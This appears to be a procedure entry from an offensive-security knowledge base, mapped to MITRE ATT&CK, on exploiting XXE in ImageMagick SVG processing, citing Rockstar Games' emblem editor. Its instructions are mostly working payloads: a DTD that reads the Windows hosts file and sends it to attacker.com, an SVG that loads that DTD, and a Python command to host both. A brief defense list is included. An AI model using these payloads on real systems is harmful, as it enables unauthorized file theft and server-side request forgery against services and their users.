---
id: proc-uuid-1
tags:
  - xxe
  - hosting
  - svg
type: procedure
tools:
  - '[[tools/ImageMagick]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/host-simple-server]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:27.545Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Host-Malicious-SVG-and-DTD-Files

## Summary

This procedure involves setting up an attacker-controlled web server to host malicious SVG and DTD files containing XXE payloads, enabling subsequent exploitation in ImageMagick processing for LFI and SSRF.

## Description

In the context of exploiting XXE in a web application's SVG processor like ImageMagick in Rockstar Games' emblem editor, the attacker first hosts external files. The DTD defines entities for reading local files (e.g., via file:///), and the SVG references it. This setup allows the target server to fetch and parse these files during SVG to PNG conversion, leading to data exfiltration. Prerequisites include domain control and basic web serving capabilities; outcomes include payload delivery without direct target interaction.

## Requirements

1. Attacker-controlled domain and server (e.g., VPS)
2. Text editor for creating SVG and DTD files
3. Web server software (e.g., Python's built-in HTTP server)

## Defense

Defensive measures and detection strategies:

- Block external DTD/SVG loading via Content-Security-Policy or URL allowlists
- Monitor outbound HTTP requests from image processing services
- Disable XXE in XML parsers (e.g., libxml2 policy)

## Objectives

1. Deliver XXE payloads to the target via external references
2. Enable LFI for sensitive file access
3. Prepare for SSRF to internal/external resources

## Instructions

### Step 1: Create DTD File

**Context**: Define external entities in exfil.dtd to read local files like the hosts file.

**Command** ([[commands/create-dtd-file]]):
```xml
<!ENTITY % file SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

> This DTD uses parameter entities to read the file and exfiltrate via HTTP. Save as exfil.dtd.

### Step 2: Create SVG File

**Context**: Reference the DTD and embed exfiltration in SVG elements.

**Command** ([[commands/create-svg-file]]):
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://attacker.com/exfil.dtd">
<svg xmlns="http://www.w3.org/2000/svg">
  <pattern id="exploit"><text>&exfil;</text></pattern>
</svg>
```

> The DOCTYPE loads the DTD, and &exfil; expands to leaked data. Save as malicious.svg.

### Step 3: Host Files

**Context**: Serve files via HTTP for target fetching.

**Command** ([[commands/host-simple-server]]):
```bash
python -m http.server 80
```

> Place files in the server directory; access at http://attacker.com/exfil.dtd and http://attacker.com/malicious.svg. Expected output: 200 OK responses.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/create-dtd-file]]
- [[commands/create-svg-file]]
- [[commands/host-simple-server]]

## Tools Used

- [[tools/ImageMagick]]

## Tags

- xxe
- svg
- dtd
